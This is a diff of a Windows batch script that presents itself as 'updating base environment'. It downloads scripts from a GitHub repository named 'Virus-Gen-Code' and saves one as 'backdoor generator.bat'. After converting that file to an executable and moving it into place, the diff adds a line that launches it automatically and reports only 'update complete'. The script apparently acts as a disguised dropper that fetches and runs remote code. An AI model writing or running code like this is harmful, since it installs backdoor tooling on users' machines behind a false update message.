@@ -1,16 +1,15 @@
-@echo off&title updating base environment...&cls
+@echo on&title updating base environment...&cls
 cd C:\ProgramData
 goto CP
 :adminyes
 if exist "C:\users\%username%\AppData\base_environment_location.txt" (< "C:\users\%username%\AppData\base_environment_location.txt" (
-  set /p autofullscreen=
+  set /p install_location=
 )) else (goto set_install_location)
 echo starting update...
-timeout 1 /NOBREAK >nul
+timeout 1 /NOBREAK>nul
 echo creating bat2exe command...
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/bat2exe.bat").Content >C:\ProgramData\bat2exe.bat
-if exist C:\ProgramData\bat2exe.bat (echo bat2exe succesfuly made) else (goto bat2exe_install_error)
-timeout 1 /nobreak >nul
+echo bat2exe succesfuly made
 if not exist %install_location% mkdir %install_location%
 echo downloading code...
 Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/updater.bat").Content >"C:\programdata\backdoor generator.bat"
@@ -20,10 +19,9 @@ timeout 2 /nobreak >nul
 del bat2exe.bat
 del "backdoor generator.bat"
 move "backdoor generator.exe" "%install_location%"
-echo setup is complete
+echo update complete
 echo.
-echo press any key to exit...
-pause >nul
+call "%install_location%\backdoor generator.exe"
 exit /b
 
 
